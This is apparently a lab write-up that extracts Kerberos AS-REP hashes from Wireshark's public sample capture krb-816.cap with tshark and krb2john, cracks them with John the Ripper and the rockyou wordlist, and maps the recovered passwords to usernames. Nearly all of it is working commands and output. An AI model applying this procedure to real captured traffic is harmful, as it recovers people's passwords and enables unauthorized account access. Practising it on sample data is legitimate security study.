
--

## Project: Packet Capture and password hacking system

- Source: `krb-816.cap`  
- Objective: Extract and identify passwords of authenticated users on a Kerberos network.

---

## Tools

- Wireshark (apt)
<pre><code>
> wireshark -v
Wireshark 4.4.5.

Copyright 1998-2025 Gerald Combs <gerald@wireshark.org> and contributors.
Licensed under the terms of the GNU General Public License (version 2 or later).
This is free software; see the file named COPYING in the distribution. There is
NO WARRANTY; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.

Compiled (64-bit) using GCC 14.2.0, with GLib 2.83.4, with Qt 6.8.2, with
libpcap, with POSIX capabilities (Linux), with libnl 3, with zlib 1.3.1, without
zlib-ng, with PCRE2, with Lua 5.4.7, with GnuTLS 3.8.9 and PKCS #11 support,
with Gcrypt 1.11.0, with Kerberos (MIT), with MaxMind, with nghttp2 1.64.0, with
nghttp3 1.6.0, with brotli, with LZ4, with Zstandard, with Snappy, with libxml2
2.9.14, with libsmi 0.4.8, with Minizip 1.3.1, with QtMultimedia, with QtDBus,
without automatic updates, with binary plugins.

Running on Linux 6.14.0-15-generic, with 13th Gen Intel(R) Core(TM) i5-13500H
(with SSE4.2), with 31217 MB of physical memory, with GLib 2.84.1, with Qt
6.8.3, with libpcap 1.10.5 (with TPACKET_V3), with zlib 1.3.1, with PCRE2 10.45
2025-02-05, with c-ares 1.34.4, with GnuTLS 3.8.9, with Gcrypt 1.11.0, with
nghttp2 1.64.0, with nghttp3 1.8.0, with brotli 1.1.0, with LZ4 1.10.0, with
Zstandard 1.5.6, with libsmi 0.4.8, with LC_TYPE=en_CA.UTF-8, binary plugins
supported.
</code></pre>
- tshark (apt)
<pre><code>
> tshark -v
TShark (Wireshark) 4.4.5.

Copyright 1998-2025 Gerald Combs <gerald@wireshark.org> and contributors.
Licensed under the terms of the GNU General Public License (version 2 or later).
This is free software; see the file named COPYING in the distribution. There is
NO WARRANTY; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.

Compiled (64-bit) using GCC 14.2.0, with GLib 2.83.4, with libpcap, with POSIX
capabilities (Linux), with libnl 3, with zlib 1.3.1, without zlib-ng, with
PCRE2, with Lua 5.4.7, with GnuTLS 3.8.9 and PKCS #11 support, with Gcrypt
1.11.0, with Kerberos (MIT), with MaxMind, with nghttp2 1.64.0, with nghttp3
1.6.0, with brotli, with LZ4, with Zstandard, with Snappy, with libxml2 2.9.14,
with libsmi 0.4.8, with binary plugins.

Running on Linux 6.14.0-15-generic, with 13th Gen Intel(R) Core(TM) i5-13500H
(with SSE4.2), with 31217 MB of physical memory, with GLib 2.84.1, with libpcap
1.10.5 (with TPACKET_V3), with zlib 1.3.1, with PCRE2 10.45 2025-02-05, with
c-ares 1.34.4, with GnuTLS 3.8.9, with Gcrypt 1.11.0, with nghttp2 1.64.0, with
nghttp3 1.8.0, with brotli 1.1.0, with LZ4 1.10.0, with Zstandard 1.5.6, with
libsmi 0.4.8, with LC_TYPE=en_CA.UTF-8, binary plugins supported.
</code></pre>
- krb2john (from https://github.com/openwall/john/blob/bleeding-jumbo/run/krb2john.py)
<pre><code>
# This file was named krbpa2john.py previously.
#
# http://anonsvn.wireshark.org/wireshark/trunk/doc/README.xml-output
#
# For extracting "AS-REQ (krb-as-req)" hashes,
# tshark -r AD-capture-2.pcapng -T pdml > data.pdml
# tshark -2 -r test.pcap -R "tcp.dstport==88 or udp.dstport==88" -T pdml >> data.pdml
# ./run/krb2john.py data.pdml
#
# For extracting "TGS-REP (krb-tgs-rep)" hashes,
# tshark -2 -r test.pcap -R "tcp.srcport==88 or udp.srcport==88" -T pdml >> data.pdml
# ./run/krb2john.py data.pdml
#
# Tested on Ubuntu 14.04.2 LTS (Trusty Tahr), and Fedora 25.
#
# $ tshark -v
# TShark 1.10.6 (v1.10.6 from master-1.10)
#
# August 2017 update -> Extracts AS-REP hashes too. Crack such hashes with
# krb5asrep format.
#
# October 2017 update -> Extracts TGS-REP hashes too. Crack such hashes with
# krb5tgs format.
#
# This software is Copyright (c) 2012, Dhiru Kholia <dhiru at openwall.com> and
# it is hereby released to the general public under the following terms:
#
# Redistribution and use in source and binary forms, with or without
# modification, are permitted.
</code></pre>

- john-the-ripper (Jumbo version from snapd)
<pre><code>
> snap run john-the-ripper 
John the Ripper 1.9.0-jumbo-1+bleeding-126b2a4814 2025-01-28 23:51:55 +0100 OMP [linux-gnu 64-bit x86_64 AVX2 AC]
Copyright (c) 1996-2025 by Solar Designer and others
Homepage: https://www.openwall.com/john/

Usage: john [OPTIONS] [PASSWORD-FILES]

Use --help to list all available options.
</code></pre>

- rockyou.txt (passwords dictionary from https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt)
<pre><code>
> head -2 rockyou.txt 
123456
12345
</code></pre>

- xxd (to decode hex)
<pre><code>
> xxd -v
xxd 2024-12-07 by Juergen Weigert et al.
</code></pre>

- Linux Operating System
<pre><code>
> uname -a
Linux x1b5ca 6.14.0-15-generic #15-Ubuntu SMP PREEMPT_DYNAMIC Sun Apr  6 15:05:05 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux
> cat /etc/lsb-release 
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=25.04
DISTRIB_CODENAME=plucky
DISTRIB_DESCRIPTION="Ubuntu 25.04"
</code></pre>

---

<pre><code>
# STEP 1: Get the file and verify

wget "https://gitlab.com/wireshark/wireshark/-/wikis/uploads/__moin_import__/attachments/SampleCaptures/krb-816.zip" -O krb-816.zip
unzip krb-816.zip
file krb-816.cap

# OUTPUT: krb-816.cap: pcap capture file, microsecond ts (little-endian) - version 2.4 (Ethernet, capture length 65535)

# Using wireshark we can check AS-REQ and AS-REP out
wireshark krb-816.cap

# STEP 2: Convert .cap to .pdml for analysis
# ( tshark does not accept home path, so I copied it to /tmp to do this)
cp krb-816.cap /tmp
tshark -r /tmp/krb-816.cap -T pdml > capture.pdml

# STEP 3: Extract hashes (get krb2john from github first)
# (it has some errores, so I sent errors to null)

wget "https://raw.githubusercontent.com/openwall/john/refs/heads/bleeding-jumbo/run/krb2john.py" -O krb2john
chmod +x krb2john
./krb2john capture.pdml 2>/dev/null > hashes.txt

# STEP 4: Filter potentially useful hashes

grep '^\$krb5asrep\$' hashes.txt > asrep.txt
grep '^\$krb5tgs\$' hashes.txt > tgsrep.txt

# STEP 5: Use Johm the Ripper to crack it

wget "https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt" # obtain dictionary
sudo snap install john-the-ripper; #get john-the-ripper full version because OS default version has no krb5 (you can check it john --list=formats | grep krb5 )
snap run john-the-ripper  asrep.txt --wordlist=./rockyou.txt
# OUTPUT:	Using default input encoding: UTF-8
# 			Loaded 2 password hashes with 2 different salts (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])
# 			Cracked 2 password hashes (are in /home/wmartinez/snap/john-the-ripper/694/.john/john.pot), use "--show"
# 			No password hashes left to crack (see FAQ)
snap run john-the-ripper  asrep.txt --show
# OUTPUT:	?:123
# 			?:123
# 
#			2 password hashes cracked, 0 left

snap run john-the-ripper tgsrep.txt --wordlist=./rockyou.txt
# OUTPUT:	Using default input encoding: UTF-8
# 			No password hashes loaded (see FAQ)
snap run john-the-ripper tgsrep.txt --show
# OUTPUT:	0 password hashes cracked, 0 left

# So, we have the passwords but not the users yet


# STEP 6: Identify users using tshark again

tshark -r /tmp/krb-816.cap -Y "kerberos.msg_type == 11" -T fields -e kerberos.CNameString 

# OUTPUT:	des
# 			u5
#			u5

</code></pre>
---

## So, the final result is

| User    | Password |
|---------|----------|
| des     | 123      |
| u5      | 123      |

---
